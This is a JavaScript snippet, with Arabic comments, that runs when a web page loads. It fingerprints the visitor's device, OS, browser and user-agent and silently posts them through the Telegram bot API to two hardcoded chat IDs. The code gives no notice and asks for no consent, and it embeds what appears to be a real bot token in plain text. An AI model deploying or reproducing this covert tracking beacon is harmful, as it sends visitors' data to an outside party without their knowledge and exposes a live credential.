window.addEventListener("DOMContentLoaded", () => {
  const parser = new UAParser();
  const result = parser.getResult();

  const deviceInfo = `
📲 Device Info
---------------
Vendor: ${result.device.vendor || 'Unknown'}
Model: ${result.device.model || 'Unknown'}
OS: ${result.os.name || 'Unknown'} ${result.os.version || ''}
Browser: ${result.browser.name || 'Unknown'} ${result.browser.version || ''}
User-Agent:
${navigator.userAgent}
  `;

  // توكن البوت
  const botToken = "7606461880:AAGtzFYAcUjppyIsKKaEyqOGRBj1mWFbXeQ";

  // حط هنا كل الـ IDs اللي تريد تبعثلهم
  const chatIds = ["1443115693", "2071334805"]; // <-- غيّر الثاني ID حسب الحاجة

  // حلقة ترسل الرسالة لكل ID
  chatIds.forEach(chatId => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: deviceInfo
      })
    }).then(response => {
      console.log(`✅ Sent to Telegram ID: ${chatId}`);
    }).catch(error => {
      console.error(`❌ Error sending to ${chatId}:`, error);
    });
  });

  // طباعة النتيجة على الصفحة (اختياري)
  document.getElementById("output").textContent = deviceInfo;
});
